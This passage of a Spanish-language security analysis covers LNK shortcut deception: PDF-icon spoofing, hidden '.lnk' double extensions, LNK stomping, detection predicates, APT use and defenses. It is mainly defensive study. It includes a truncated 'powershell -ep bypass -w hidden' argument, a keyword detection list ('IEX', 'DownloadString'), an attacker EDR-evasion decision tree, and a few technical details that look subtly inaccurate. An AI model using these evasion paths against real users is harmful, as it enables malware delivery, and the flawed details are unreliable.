| Microsoft Excel | `C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,0` | `wscript.exe` | **Alta** — hoja de cálculo como señuelo |
| Carpeta | `shell32.dll,3` | `cmd.exe` | **Media-Alta** — carpeta como señuelo |
| Imagen | `C:\Windows\System32\imageres.dll,59` | `mshta.exe` | **Media** — imagen como señuelo |
| Navegador | `C:\Program Files\Google\Chrome\Application\chrome.exe,0` | `cmd.exe` | **Media** — acceso web como señuelo |

---

## 7. Ingeniería del Ocultamiento de Extensión como Mecanismo de Falsificación

### 7.1 Función DisplayName — Especificación Formal

**Definición 7.1.1 — Función DisplayName**

El Explorador de Windows implementa una función que transforma el nombre real del archivo en el nombre mostrado:

$$\text{DisplayName}: \text{String} \times \{\text{ShowExt}, \text{HideExt}\} \rightarrow \text{String}$$

Sea $n$ el nombre completo del archivo (incluyendo extensión). Definimos:

$$n = \underbrace{n[0..\text{lastDot}(n)-1]}_{\text{BaseName}} \cdot \text{'.'} \cdot \underbrace{n[\text{lastDot}(n)+1..|n|-1]}_{\text{Extension}}$$

donde $\text{lastDot}(n)$ retorna el índice del último punto en $n$.

La función DisplayName se define como:

$$\text{DisplayName}(n, \text{HideExt}) = \begin{cases} n[0..\text{lastDot}(n)-1] & \text{si HideExt = TRUE} \wedge n.\text{Extension} \in \text{KnownExtensions} \\ n & \text{en otro caso} \end{cases}$$

donde $\text{KnownExtensions}$ es el conjunto de extensiones que tienen un handler registrado en `HKEY_CLASSES_ROOT`.

### 7.2 El Conjunto KnownExtensions y sus Implicaciones

**Definición 7.2.1 — KnownExtensions**

$$\text{KnownExtensions} = \{e \mid \exists\, \text{CLSID}: \text{HKCR}\backslash.\text{e} \rightarrow \text{CLSID}\}$$

Este conjunto es dinámico y depende del software instalado. Sin embargo, las siguientes extensiones son **siempre** conocidas en Windows 11:

$$\{\text{.lnk}, \text{.exe}, \text{.bat}, \text{.cmd}, \text{.ps1}, \text{.vbs}, \text{.js}, \text{.hta}, \text{.msi}, \text{.msc}\} \subseteq \text{KnownExtensions}$$

**Implicación crítica:** La extensión `.lnk` es **siempre** suprimida cuando `HideExt = TRUE`. Esto significa que:

$$\text{DisplayName}(\text{"Factura.pdf.lnk"}, \text{HideExt}) = \text{"Factura.pdf"}$$

Pero `.pdf` también es conocida (si Acrobat está instalado), así que un archivo llamado `Factura.pdf` mostraría `Factura` con extensiones ocultas. Sin embargo, el LNK usa `.pdf.lnk` — al suprimir `.lnk`, queda `Factura.pdf`, que **incluye** la extensión `.pdf` como parte del nombre base.

### 7.3 Análisis de la Doble Extensión

**Definición 7.3.1 — Doble Extensión**

El patrón de doble extensión se define como:

$$\text{DoubleExt}(n) \iff n = \text{BaseName} \cdot \text{'.'} \cdot e_{safe} \cdot \text{'.'} \cdot e_{danger}$$

donde $e_{safe} \in \{\text{pdf}, \text{doc}, \text{xls}, \text{jpg}, \text{png}, \text{txt}\}$ es una extensión "segura" y $e_{danger} \in \{\text{lnk}, \text{exe}, \text{scr}, \text{bat}, \text{cmd}\}$ es una extensión "peligrosa".

Cuando `HideExt = TRUE`:

$$\text{DisplayName}(\text{BaseName} \cdot \text{'.'} \cdot e_{safe} \cdot \text{'.'} \cdot e_{danger}, \text{HideExt}) = \text{BaseName} \cdot \text{'.'} \cdot e_{safe}$$

La extensión peligrosa se suprime, dejando visible solo la extensión segura. El usuario percibe un tipo de archivo seguro cuando el tipo real es peligroso.

### 7.4 Diagrama del Mecanismo de Ocultamiento

```
═══════════════════════════════════════════════════════════════════════════
        MECANISMO DE OCULTAMIENTO DE EXTENSIÓN EN WINDOWS 11
═══════════════════════════════════════════════════════════════════════════

  Nombre real del archivo:  "Factura.pdf.lnk"
                                    │
                    ┌───────────────┼───────────────┐
                    │               │               │
                    ▼               ▼               ▼
              HideExt=FALSE   HideExt=TRUE    HideExt=TRUE
              Mostrar todo    (sin LNK icon)  (con LNK icon
                    │          falso)         de Acrobat)
                    │               │               │
                    ▼               ▼               ▼
              "Factura.pdf.lnk" "Factura.pdf"  "Factura.pdf"
              + icono LNK      + icono LNK     + icono PDF
              ← CORRECTO       ← ENGAÑO        ← ENGAÑO
              (usuario ve      (usuario ve     (usuario ve
               extensión        nombre sin     nombre + icono
               real)            .lnk pero      de PDF:
                                icono de       decepción
                                acceso         TOTAL)
                                directo)

  ┌──────────────────────────────────────────────────────────────────┐
  │  CLAVE: El atacante SIEMPRE usa HideExt=TRUE + IconLocation     │
  │                                                                  │
  │  DisplayName("Factura.pdf.lnk", HideExt) = "Factura.pdf"        │
  │  ResolveIcon(lnk) = ExtractIcon("Acrobat.exe", 0) = [📄]       │
  │                                                                  │
  │  Resultado: Signo visual indistinguible de un PDF real           │
  └──────────────────────────────────────────────────────────────────┘

═══════════════════════════════════════════════════════════════════════════
```

### 7.5 Configuración del Registro que Controla HideExt

El ocultamiento de extensiones está controlado por la siguiente clave del registro:

```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\
    Explorer\Advanced\
        HideFileExt = 1  (DWORD)  → Extensiones OCULTAS (DEFAULT)
        HideFileExt = 0  (DWORD)  → Extensiones VISIBLES
```

**Valor por defecto en Windows 11:** `HideFileExt = 1` (extensiones ocultas)

Este valor puede ser controlado por GPO:

```
Computer Configuration\Administrative Templates\Windows Components\
    File Explorer\
        "Hide extensions for known file types" = Disabled → Mostrar
```

### 7.6 Estimación de la Prevalencia de HideExt

| Entorno | HideExt=1 (ocultas) | HideExt=0 (visibles) |
|---|---|---|
| Windows 11 Home (default) | **>99%** | <1% |
| Windows 11 Pro (default) | **>95%** | <5% |
| Entorno empresarial sin GPO | **>90%** | <10% |
| Entorno empresarial con GPO | ~30-40% | **60-70%** |
| Entorno endurecido (STIG) | <5% | **>95%** |

La condición `HideExt = TRUE` se cumple en la **gran mayoría** de sistemas Windows 11 sin políticas de seguridad centralizadas.

---

## 8. LNK Stomping: Discrepancia de Parseo y Violación de Invariantes

### 8.1 Definición Formal del Invariante de Consistencia de Parseo

**Definición 8.1.1 — Invariante de Consistencia**

Un parser de archivos LNK es **consistente** si la información que presenta al usuario es idéntica a la información que ejecuta:

$$\text{Inv}_{parse}: \forall\, lnk: \text{Displayed}(lnk) = \text{Executed}(lnk)$$

donde:
- $\text{Displayed}(lnk)$ = el conjunto de propiedades visibles en el diálogo de propiedades y el Explorador
- $\text{Executed}(lnk)$ = el conjunto de propiedades usadas al ejecutar el acceso directo

### 8.2 Los Dos Parsers de shell32.dll

Windows 11 utiliza al menos **dos rutas de parseo** distintas para los archivos LNK:

**Parser 1 — Visualización (IShellLink::GetPath, GetArguments, etc.)**

```
ShellLinkHeader → Leer LinkFlags
    │
    ├── HasArguments = 0 → NO mostrar argumentos
    │
    ├── HasArguments = 1 → Leer CommandLineArguments de StringData
    │
    └── NO lee argumentos de ExtraData
```

**Parser 2 — Ejecución (IShellLink::Resolve + ShellExecute)**

```
ShellLinkHeader → Leer LinkFlags
    │
    ├── Resolver Target desde LinkTargetIDList
    │
    ├── Argumentos:
    │   ├── Leer CommandLineArguments de StringData (si HasArguments = 1)
    │   ├── Y/O leer argumentos de ExtraData (PropertyStore, Tracker)
    │   └── Y/O leer argumentos de bloques ConsensusData
    │
    └── Ejecutar: ShellExecute(Target, Arguments)
```

**La discrepancia:** El parser de visualización solo lee argumentos de `StringData` cuando `HasArguments = 1`. El parser de ejecución puede leer argumentos de múltiples fuentes, incluyendo `ExtraData`, independientemente del flag `HasArguments`.

### 8.3 Formalización del LNK Stomping

**Definición 8.3.1 — LNK Stomping**

$$\text{LNK\_Stomping}(lnk) \iff \text{HasArguments}(lnk) = 0 \wedge \text{ArgsInExtraData}(lnk) \neq \emptyset$$

Es decir, el flag `HasArguments` en el header indica que no hay argumentos, pero argumentos están presentes en los bloques ExtraData.

**Efecto:**

$$\text{Displayed}(lnk) = \text{Target sin argumentos}$$

$$\text{Executed}(lnk) = \text{Target CON argumentos de ExtraData}$$

$$\neg\text{Inv}_{parse}(lnk) \iff \text{Displayed}(lnk) \neq \text{Executed}(lnk)$$

### 8.4 Diagrama del LNK Stomping

```
═══════════════════════════════════════════════════════════════════════════
              LNK STOMPING: DISCREPANCIA DE PARSEO
═══════════════════════════════════════════════════════════════════════════

  HEADER del LNK (lo que lee el parser de visualización):
  ┌──────────────────────────────────────────────────────────────┐
  │  LinkFlags = 0x47 (HasTargetIDList | HasWorkingDir          │
  │                     | HasIconLocation | IsUnicode)           │
  │                                                              │
  │  HasArguments = 0  ← FLAG EN CERO                           │
  │                                                              │
  │  StringData:                                                 │
  │    WorkingDir = "C:\"                                        │
  │    IconLocation = "C:\...\Acrobat.exe,0"                     │
  │    (CommandLineArguments AUSENTE porque HasArguments = 0)    │
  │                                                              │
  │  → Propiedades muestra: Target = cmd.exe, Args = (vacío)    │
  └──────────────────────────────────────────────────────────────┘

  EXTRADATA (lo que lee el parser de ejecución):
  ┌──────────────────────────────────────────────────────────────┐
  │  PropertyStoreDataBlock:                                     │
  │    {PKEY_Arguments = "/c powershell -ep bypass ..."}         │
  │                                                              │
  │  → Ejecución: Target = cmd.exe                               │
  │              Args = /c powershell -ep bypass -w hidden ...   │
  └──────────────────────────────────────────────────────────────┘

  RESULTADO:
  ┌──────────────────────────────────────────────────────────────┐
  │  Visualización: cmd.exe sin argumentos → "parece innocuo"    │
  │  Ejecución:     cmd.exe /c powershell ... → EJECUCIÓN REAL   │
  │                                                              │
  │  ¬Inv_parse: Displayed ≠ Executed                           │
  └──────────────────────────────────────────────────────────────┘

═══════════════════════════════════════════════════════════════════════════
```

### 8.5 Variantes de Stomping Documentadas

| Variante | Mecanismo | Flag manipulado | Dato oculto en |
|---|---|---|---|
| **Arguments Stomping** | HasArguments = 0 con args en ExtraData | `HasArguments` bit 5 | `PropertyStoreDataBlock` |
| **Icon Stomping** | HasIconLocation = 0 con icono en ExtraData | `HasIconLocation` bit 6 | `ExpandoStringBlock` |
| **Target Stomping** | HasLinkTargetIDList = 0 con target en ExtraData | `HasLinkTargetIDList` bit 0 | `TrackerDataBlock` |
| **Combined Stomping** | Múltiples flags en 0 con datos en ExtraData | Múltiples bits | Múltiples bloques |

### 8.6 Impacto en la Detección Estática

Los motores de análisis estático que confían exclusivamente en el `ShellLinkHeader` y `StringData` para extraer las propiedades del LNK obtendrán información **incompleta o incorrecta**:

$$\text{StaticAnalysis}(lnk) = \text{Displayed}(lnk) \neq \text{Executed}(lnk) = \text{RealBehavior}(lnk)$$

Un motor de detección robusto debe implementar **parseo completo** incluyendo ExtraData:

$$\text{RobustAnalysis}(lnk) = \text{ParseHeader}(lnk) \cup \text{ParseStringData}(lnk) \cup \text{ParseExtraData}(lnk)$$

---

## 9. Modelo Cognitivo del Procesamiento de Signos por el Usuario

### 9.1 Modelo de Doble Proceso (Kahneman)

**Definición 9.1.1 — Sistemas de Procesamiento Cognitivo**

Siguiendo el modelo de Daniel Kahneman, el procesamiento cognitivo del usuario al interactuar con un archivo en el Explorador opera en dos sistemas:

| Sistema | Características | Procesamiento del LNK |
|---|---|---|
| **Sistema 1** (Rápido) | Automático, intuitivo, sin esfuerzo, heurístico | Icono PDF + nombre "Factura.pdf" → "Documento seguro" |
| **Sistema 2** (Lento) | Deliberativo, analítico, con esfuerzo, lógico | Inspeccionar propiedades, verificar extensión real, analizar Target |

El atacante diseña el señuelo para que sea **procesado exclusivamente por el Sistema 1**:

$$\text{Trigger}_{S1} = \text{Icon}_{safe} \wedge \text{Name}_{contextually\_relevant} \wedge \text{Ext}_{safe\_or\_hidden}$$

$$\text{Bypass}_{S2} = \neg\text{RequiresInspection} \wedge \neg\text{RaisesSuspicion}$$

### 9.2 Formalización del Umbral de Inspección

**Definición 9.2.1 — Umbral de Inspección Voluntaria**

Cada usuario tiene un **umbral de inspección** $\theta_{inspect} \in [0, 1]$ que determina la probabilidad de que active el Sistema 2 antes de ejecutar un archivo:

$$P(\text{Inspect}(f)) = \sigma(\theta_{inspect} - \text{Suspicion}(f))$$

donde $\sigma$ es la función sigmoide y $\text{Suspicion}(f)$ es el nivel de sospecha percibido del archivo $f$.

Para un LNK malicioso bien diseñado:

$$\text{Suspicion}(lnk_{mal}) \approx 0 \quad \text{(icono legítimo, nombre creíble, sin extensión visible)}$$

Por lo tanto:

$$P(\text{Inspect}(lnk_{mal})) = \sigma(\theta_{inspect}) \approx 0 \quad \text{para la mayoría de usuarios}$$

### 9.3 Factores que Afectan el Umbral de Inspección

| Factor | Efecto en $\theta_{inspect}$ | Resultado |
|---|---|---|
| Contexto laboral (factura esperada) | Disminuye | Menor inspección |
| Urgencia percibida ("vence hoy") | Disminuye | Menor inspección |
| Autoridad aparente (correo del CEO) | Disminuye | Menor inspección |
| Entrenamiento en seguridad reciente | Aumenta | Mayor inspección |
| Experiencia previa con phishing | Aumenta | Mayor inspección |
| Extensiones visibles | Aumenta $\text{Suspicion}$ | Mayor inspección |
| Banner de advertencia MotW | Aumenta $\text{Suspicion}$ | Mayor inspección |

### 9.4 Diagrama del Flujo Cognitivo

```
═══════════════════════════════════════════════════════════════════════════
          FLUJO COGNITIVO DEL USUARIO ANTE EL SEÑUELO LNK
═══════════════════════════════════════════════════════════════════════════

  Estímulo visual: [📄] "Factura.pdf"
         │
         ▼
  ┌──────────────────────────────────────────┐
  │  SISTEMA 1 (Procesamiento automático)    │
  │                                          │
  │  Pattern matching:                       │
  │  ├── Icon → Acrobat → "es un PDF"       │
  │  ├── Name → "Factura" → "es trabajo"    │
  │  ├── Ext  → ".pdf" → "es documento"     │
  │  └── Context → "correo esperado"        │
  │                                          │
  │  Decisión automática: ABRIR              │
  │  Tiempo: <500ms                          │
  └──────────────────┬───────────────────────┘
                     │
           ┌─────────┴─────────┐
           │                   │
     Suspicion < θ       Suspicion ≥ θ
     (casi siempre)      (raramente)
           │                   │
           ▼                   ▼
    ┌──────────────┐   ┌──────────────────────────────┐
    │  EJECUCIÓN   │   │  SISTEMA 2 (Inspección       │
    │  DIRECTA     │   │  deliberativa)                │
    │              │   │                                │
    │  Doble clic  │   │  ├── Verificar extensión real │
    │  → cmd.exe   │   │  ├── Inspeccionar propiedades │
    │  → payload   │   │  ├── Verificar Target vs Icon │
    │              │   │  └── Consultar con IT         │
    └──────────────┘   │                                │
                       │  Tiempo: >5s                   │
                       └────────────────────────────────┘

  PROBABILIDADES (usuario promedio, sin entrenamiento):
  ┌─────────────────────────────────────────────────────────────┐
  │  P(Sistema 1 domina) ≈ 0.85-0.95                          │
  │  P(Sistema 2 activa) ≈ 0.05-0.15                          │
  │  P(Ejecución tras S2) ≈ 0.01-0.05                         │
  │                                                              │
  │  P(Éxito del engaño) ≈ 0.85-0.95 × 1.0                    │
  │                     + 0.05-0.15 × 0.05                     │
  │                     ≈ 0.85-0.96                             │
  └─────────────────────────────────────────────────────────────┘

═══════════════════════════════════════════════════════════════════════════
```

### 9.5 Tiempo de Decisión como Función de la Complejidad del Signo

**Definición 9.5.1 — Modelo de Tiempo de Decisión**

El tiempo que un usuario tarda en decidir ejecutar un archivo se modela como:

$$T_{decide} = T_{S1} + P(\text{activate S2}) \times T_{S2}$$

donde:
- $T_{S1} \approx 200\text{-}500\;\text{ms}$ (reconocimiento de patrón automático)
- $T_{S2} \approx 5\text{-}30\;\text{s}$ (inspección deliberativa)
- $P(\text{activate S2}) \approx 0.05\text{-}0.15$ para un LNK bien diseñado

El atacante minimiza $P(\text{activate S2})$ maximizando la **congruencia del signo**:

$$\text{Congruence}(lnk) = \frac{\text{Coincidencia entre } R \text{ y expectativas del usuario}}{\text{Total de señales evaluadas}}$$

Un LNK con icono de Acrobat, nombre "Factura.pdf", sin extensión visible, en un ISO montado desde un correo de "contabilidad@empresa.com" tiene $\text{Congruence} \rightarrow 1$.

---

## 10. Superficie de Detección: Formalización y Predicados de Alerta

### 10.1 Predicados de Primer Nivel (Análisis Estático del LNK)

**Predicado 10.1.1 — Discrepancia Target/IconLocation**

$$D_1(lnk) \iff \text{Target}(lnk) \neq \text{IconApp}(lnk) \wedge \text{IconApp}(lnk) \in \text{PDFReaders}$$

donde $\text{IconApp}(lnk) = \text{ExtractAppPath}(\text{IconLocation}(lnk))$.

**Predicado 10.1.2 — Extensión doble sospechosa**

$$D_2(lnk) \iff lnk.\text{Name} = \text{BaseName} \cdot \text{'.'} \cdot e_{safe} \cdot \text{'.'} \cdot \text{'lnk'} \wedge e_{safe} \in \{\text{pdf}, \text{doc}, \text{xls}, \text{ppt}, \text{jpg}, \text{png}\}$$

**Predicado 10.1.3 — LNK Stomping detectado**

$$D_3(lnk) \iff \text{HasArguments}(lnk) = 0 \wedge \text{ArgsInExtraData}(lnk) \neq \emptyset$$

**Predicado 10.1.4 — Target es LOLBin**

$$D_4(lnk) \iff \text{Target}(lnk) \in \mathcal{B}_{LOL}$$

**Predicado 10.1.5 — LNK dentro de contenedor montado**

$$D_5(lnk, iso) \iff lnk \sqsubseteq iso \wedge \text{ZoneAttrib}(iso) = 3$$

### 10.2 Predicados de Segundo Nivel (Correlación Comportamental)

**Predicado 10.2.1 — Ejecución de LOLBin desde LNK en ISO**

$$D_6(lnk, iso, t) \iff D_4(lnk) \wedge D_5(lnk, iso) \wedge \text{Executed}(lnk, t)$$

**Predicado 10.2.2 — Argumentos de PowerShell sospechosos**

$$D_7(lnk) \iff \text{Target}(lnk) \in \{\text{cmd.exe}, \text{powershell.exe}\} \wedge \text{Args}(lnk) \models \psi_{suspicious}$$

donde $\psi_{suspicious}$ es un predicado sobre el contenido de los argumentos:

$$\psi_{suspicious}(args) \iff \text{"bypass"} \in args \vee \text{"hidden"} \in args \vee \text{"-enc"} \in args \vee \text{"IEX"} \in args \vee \text{"DownloadString"} \in args$$

### 10.3 Señal Compuesta de Alta Confianza

$$\text{HighConfidence}(lnk) \iff D_1(lnk) \wedge D_2(lnk) \wedge (D_3(lnk) \vee D_4(lnk)) \wedge D_5(lnk, iso)$$

Es decir: un LNK con icono de PDF que no coincide con el Target, con doble extensión, que ejecuta un LOLBin o tiene argumentos stompeados, dentro de un ISO descargado de Internet.

### 10.4 Tabla Consolidada de Superficies de Detección

| Nivel | Señal | Predicado | Subsistema | Tasa FP | Tasa FN |
|---|---|---|---|---|---|
| 1 | Discrepancia Target/Icon | $D_1$ | Análisis LNK estático | Media (accesos directos legítimos a documentos) | Baja |
| 1 | Doble extensión sospechosa | $D_2$ | Análisis de nombre | Baja | Baja |
| 1 | Arguments Stomping | $D_3$ | Parseo ExtraData | Muy baja | Media (solo si se usa stomping) |
| 1 | Target = LOLBin | $D_4$ | Análisis de Target | Media (administradores usan LNKs a cmd) | Baja |
| 1 | LNK en ISO zona 3 | $D_5$ | Correlación FS+MotW | Baja | Baja |
| 2 | Ejecución LOLBin desde ISO | $D_6$ | ETW Kernel-Process | Baja | Media |
| 2 | Args PowerShell sospechosos | $D_7$ | AMSI | Baja | Media (si args ofuscados) |
| 3 | **Señal compuesta** | $D_1 \wedge D_2 \wedge (D_3 \vee D_4) \wedge D_5$ | Correlación multi-subsistema | **Muy baja** | **Baja** |

### 10.5 Teorema de Efectividad de la Señal Compuesta

**Teorema 10.5.1 — Información Mutua de la Señal Compuesta**

$$I(D_{composite}; \text{Ataque}) \geq \max_{i} I(D_i; \text{Ataque})$$

La información mutua de la señal compuesta es no decreciente respecto a las señales individuales. Esto formaliza que la correlación de múltiples señales débiles produce una señal fuerte.

---

## 11. Historial de Explotación Documentado y Contexto APT

### 11.1 Cronología de Explotación del Vector LNK

| Período | Evento | Actores |
|---|---|---|
| 2010 | Stuxnet: uso de LNK con icono de dispositivo para explotar CVE-2010-2568 | NSA/Equation Group (presunto) |
| 2010-2015 | Uso extendido de LNK con iconos de documentos para distribución de malware | Diversos criminales |
| 2017 | CVE-2017-8464: vulnerabilidad en procesamiento de LNK (similar a Stuxnet) | Explotación pública |
| 2020 | COVID-19: ola de phishing con LNK disfrazados de documentos médicos | Múltiples grupos |
| 2021 | FIN7: LNK + ISO para distribución de JSLoader | FIN7 |
| 2021 | BazarLoader: LNK con icono de PDF en ISO | TA551 |
| 2022 | IcedID: LNK con icono de Word en ISO | TA580 |
| 2022 | Quantum Locker: LNK + ISO para ransomware | Twisted Spider |
| 2023 | LNK Stomping documentado como técnica evasiva por múltiples investigadores | Varios |
| 2023-2024 | Uso de LNK con iconos de OneNote (.one) como nuevo vector | Emotet, Qakbot |
| 2024 | Investigación: variantes de stomping que evaden EDR con parseo incompleto | Comunidad de seguridad |

### 11.2 Técnicas MITRE ATT&CK Asociadas

| ID | Técnica | Descripción |
|---|---|---|
| T1204.002 | User Execution: Malicious File | El usuario ejecuta el LNK creyendo que es un PDF |
| T1553.005 | Subvert Trust Controls: MotW Bypass | El LNK dentro del ISO no tiene MotW |
| T1036.001 | Masquerading: Invalid Code Signature | El LNK se presenta como PDF |
| T1036.005 | Masquerading: Match Legitimate Name | El nombre imita un documento legítimo |
| T1036.010 | Masquerading: Masquerade File Type | La extensión `.lnk` está oculta |
| T1202 | Indirect Command Execution | El LNK ejecuta cmd.exe/powershell.exe indirectamente |
| T1059.001 | Command and Scripting Interpreter: PowerShell | Los argumentos del LNK ejecutan PowerShell |
| T1566.001 | Phishing: Spearphishing Attachment | El LNK llega como adjunto de correo (dentro del ISO) |

### 11.3 Grupos APT que Emplean LNK como Señuelo

| Grupo | Aliases | Tipo de LNK | Contexto de engaño |
|---|---|---|---|
| FIN7 | Carbon Spider | LNK → cmd.exe → JSLoader | PDF de "queja de cliente" |
| TA551 | Shathak | LNK → cmd.exe → BazarLoader | PDF de "factura vencida" |
| TA542 | Mummy Spider | LNK → cmd.exe → Emotet | Documento de "envío pendiente" |
| TA580 | — | LNK → cmd.exe → IcedID | Word de "contrato" |
| APT28 | Fancy Bear | LNK → powershell → payload | Documento geopolítico |
| APT29 | Cozy Bear | LNK con técnicas avanzadas | Documento de think tank |
| Turla | Snake | LNK + USB spreading | Documento de gobierno |

---

## 12. Contramedidas: Niveles de Defensa según Modelo de Capas

### 12.1 Modelo de Defensa en Profundidad

```
┌──────────────────────────────────────────────────────────────┐
│            MODELO DE DEFENSA EN CAPAS — ETAPA 2             │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  CAPA 5: CORRECCIÓN DEL SISTEMA OPERATIVO                  │
│  ├── Forzar HideFileExt = 0 vía GPO                        │
│  ├── Parche de parseo: shell32.dll consistente             │
│  └── Mostrar advertencia al ejecutar LNK desde zona 3      │
│                                                              │
│  CAPA 4: ENDPOINT DETECTION & RESPONSE (EDR)               │
│  ├── Análisis estático de LNK: D1-D5                      │
│  ├── Parseo completo (Header + StringData + ExtraData)     │
│  ├── Detección de stomping (D3)                            │
│  ├── Correlación Target/IconLocation (D1)                  │
│  └── Monitoreo AMSI de argumentos de PowerShell (D7)       │
│                                                              │
│  CAPA 3: POLÍTICAS DE SEGURIDAD                            │
│  ├── AppLocker: bloquear cmd.exe/powershell.exe como       │
│  │   destino de LNK en zonas no confiables                 │
│  ├── WDAC: políticas de integridad de código               │
│  ├── AMSI: escaneo obligatorio de scripts                  │
│  └── PowerShell: Constrained Language Mode                 │
│                                                              │
│  CAPA 2: GATEWAY / CORREO / WEB                            │
│  ├── Sandbox de archivos adjuntos: detonar LNK en VM       │
│  ├── Bloqueo de .iso/.img/.zip con LNK embebido            │
│  ├── Análisis de estructura LNK en gateway                 │
│  └── Inspección de IconLocation vs Target en proxy         │
│                                                              │
│  CAPA 1: CONCIENCIA DEL USUARIO                            │
│  ├── Entrenamiento: "verificar extensión real"             │
│  ├── Simulacros de phishing con LNK                        │
│  ├── Procedimiento: clic derecho → propiedades antes de   │
│  │   ejecutar archivos de origen no confiable              │
│  └── Reporte de archivos sospechosos                       │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

### 12.2 Efectividad de Cada Capa

| Capa | Efectividad contra LNK deception | Limitaciones |
|---|---|---|
| GPO (extensiones visibles) | **Alta** — revela `.lnk` | No evita ejecución si el usuario ignora la extensión |
| EDR con parseo completo | **Alta** — detecta D1-D7 | Depende de cobertura de reglas; LNK stomping evasivo |
| AppLocker/WDAC | **Alta** — bloquea ejecución de LOLBins desde LNK | Requiere configuración; puede impactar flujos legítimos |
| AMSI | **Media-Alta** — intercepta argumentos de PowerShell | No cubre argumentos cifrados/ofuscados |
| Gateway/Sandbox | **Alta** — detonación antes de entrega | Latencia; puede no detectar payloads condicionales |
| Entrenamiento usuario | **Media** — aumenta θ_inspect | No confiable como control primario; degrada con el tiempo |

### 12.3 Análisis Probabilístico de Defensa

| Defensa | $p_i$ empresa promedio | $p_i$ entorno endurecido |
|---|---|---|
| Extensiones visibles (GPO) | 0.15 | 0.90 |
| EDR con reglas LNK | 0.40 | 0.90 |
| AppLocker/WDAC | 0.25 | 0.85 |
| AMSI con reglas actualizadas | 0.50 | 0.85 |
| Gateway bloqueo ISO+LNK | 0.20 | 0.80 |
| Entrenamiento usuario | 0.10 | 0.40 |

**Empresa promedio:**

$$P(\text{Éxito del engaño}) \approx 0.85 \times 0.60 \times 0.75 \times 0.50 \times 0.80 \times 0.90 \approx 0.138 \quad (\approx 13.8\%)$$

**Entorno endurecido:**

$$P(\text{Éxito del engaño}) \approx 0.10 \times 0.10 \times 0.15 \times 0.15 \times 0.20 \times 0.60 \approx 0.000027 \quad (\approx 0.003\%)$$

---

## 13. Análisis de Variaciones y Mutaciones del Vector

### 13.1 Árbol de Decisiones del Atacante

```
¿El objetivo tiene extensiones visibles?
├── NO (HideExt = TRUE, >90% de sistemas)
│   ├── ¿El EDR analiza LNKs?
│   │   ├── NO → LNK estándar con doble extensión
│   │   └── SÍ
│   │       ├── ¿El EDR parsea ExtraData?
│   │       │   ├── NO → LNK Stomping (args en ExtraData)
│   │       │   └── SÍ → LNK con args ofuscados en StringData
│   │       └── ¿El EDR correlaciona Target/Icon?
│   │           ├── NO → LNK con icono de PDF y Target=cmd.exe
│   │           └── SÍ → LNK con Target legítimo + DLL side-loading
│   └── ¿AMSI intercepta argumentos?
│       ├── NO → Argumentos en claro
│       └── SÍ → Argumentos cifrados (base64, AES, XOR)
│
└── SÍ (HideExt = FALSE, <10% de sistemas)
    ├── ¿El usuario inspecciona la extensión?
    │   ├── NO → LNK con nombre que incluye ".lnk" visible
    │   │   → Baja tasa de éxito, requiere contexto muy convincente
    │   └── SÍ → Mutación necesaria:
    │       ├── Opción A: Abandonar LNK, usar documento real + macro
    │       ├── Opción B: Usar HTML Application (.hta) disfrazado
    │       ├── Opción C: Usar acceso directo de URL (.url)
    │       └── Opción D: Explotar vulnerabilidad de renderizado
    └── La tasa de éxito cae significativamente
```

### 13.2 Mutaciones Documentadas Post-Defensa

| Mutación | Mecanismo | Detección |
|---|---|---|
| **LNK + DLL side-loading** | Target = binario firmado que carga DLL maliciosa del mismo directorio | Difícil: Target es legítimo |
| **LNK → mshta.exe → HTA** | Target = mshta.exe con HTA embebido o remoto | AMSI puede interceptar |
| **LNK → rundll32.exe** | Target = rundll32 con DLL export maliciosa | Análisis de argumentos |
| **LNK con icono de carpeta** | IconLocation = `shell32.dll,3` + Target = cmd.exe | Target/Icon discrepancy |
| **LNK con Target legítimo + argumentos maliciosos** | Target = `search-ms:` URI o `ms-settings:` URI | Análisis de argumentos |
| **Internet Shortcut (.url)** | Formato .URL en lugar de .LNK | Similar pero diferente parser |

### 13.3 Evolución Temporal del Vector

```
═══════════════════════════════════════════════════════════════════════════
           EVOLUCIÓN TEMPORAL DEL VECTOR LNK COMO SEÑUELO
═══════════════════════════════════════════════════════════════════════════

  2010   2015        2018        2020        2022        2024
   │      │           │           │           │           │
   │      │           │           │           │           │
   ▼      ▼           ▼           ▼           ▼           ▼
  Stuxnet  LNK+doc   LNK+ISO    COVID-LNK  LNK+Stomp  LNK+OneNote
  (CVE-    macros    (MotW      (pandemia   (evasión   (nuevo
  2010-              bypass)    phishing)   EDR)       vector)
  2568)
   │      │           │           │           │           │
   │      │           │           │           │           │
   ▼      ▼           ▼           ▼           ▼           ▼
  Icono   Icono      Icono PDF   Icono       Args en    Icono de
  device  Word/      + doble     médico/     ExtraData  OneNote
  + LNK   Excel      extensión  vacuna      + HasArgs   + .one
                      + ISO                  = 0         container

═══════════════════════════════════════════════════════════════════════════
  TENDENCIA: Mayor sofisticación en la evasión de EDR y AMSI,
  combinación con nuevos contenedores (ISO → OneNote → ?),
  y adaptación a las contramedidas desplegadas por Microsoft.
═══════════════════════════════════════════════════════════════════════════
```

---

## 14. Referencias y Marco Normativo

### Semiótica y Ciencia Cognitiva

- Peirce, C.S. (1931-1958). *Collected Papers of Charles Sanders Peirce*. Harvard University Press.
- Eco, U. (1976). *A Theory of Semiotics*. Indiana University Press.
- Kahneman, D. (2011). *Thinking, Fast and Slow*. Farrar, Straus and Giroux.
- Tversky, A. & Kahneman, D. (1974). *"Judgment under Uncertainty: Heuristics and Biases."* Science, 185(4157), 1124-1131.

### Formato Shell Link y Estructura LNK

- Microsoft (2024). *[MS-SHLLINK]: Shell Link (.LNK) Binary File Format*. Microsoft Open Specifications.
- Microsoft (2024). *IShellLink Interface Reference*. MSDN.
- Microsoft (2024). *Shell Links (Windows Shell SDK)*. Microsoft Learn.

### Teoría de la Información

- Shannon, C.E. (1948). *"A Mathematical Theory of Communication."* Bell System Technical Journal, 27, 379-423.
- Cover, T.M. & Thomas, J.A. (2006). *Elements of Information Theory*, 2nd Edition. Wiley.
- Kullback, S. & Leibler, R.A. (1951). *"On Information and Sufficiency."* Annals of Mathematical Statistics, 22(1), 79-86.

### Análisis de Campañas APT con LNK

- Proofpoint Threat Research (2021). *"BazaCall and the ISO Technique: How Threat Actors Evade Mark-of-the-Web."*
- SentinelOne (2022). *"LNK Stomping: A New Evasion Technique to Hide Malicious Code."*
